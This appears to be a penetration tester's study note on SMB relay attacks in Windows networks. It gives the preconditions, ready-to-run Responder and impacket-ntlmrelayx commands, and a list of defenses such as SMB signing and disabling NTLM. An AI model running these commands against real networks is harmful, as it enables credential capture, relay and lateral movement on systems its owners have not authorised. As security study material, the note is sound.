- [ ] SMB Signing **disabled**
- [ ] Responder HTTP and SMB servers module turned off
- [ ] Relayed account must be admin on other machine for any real value

![](../img/Pasted%20image%2020260103230909.png)
Responder 
```bash
sudo responder -I <interface> -dwPv
```
SMB relay
- `TARGET_FILE` contains IPs of relay targets.
```bash
impacket-ntlmrelayx -tf <TARGET_FILE> -smb2support
```
## Defenses

- Enable SMB message signing on all devices (completely stops the attack, however, may cause performance issues with file copies). (Computer Configuration -> Windows Settings -> Security Settings -> Local Policies -> Security Options > "Microsoft network client: Digitally sign communications (always)” enable).
- Disable NTLM account authentication on network (completely stops the attack, however, if Kerberos stop working Windows default back to NTLM authentication).
- Account tiering (limit domain admins to specific tasks, however, this may be difficult to enforce policies).
- Local admin restrictions (can prevent lateral movement, however, may result in more helpdesk tickets).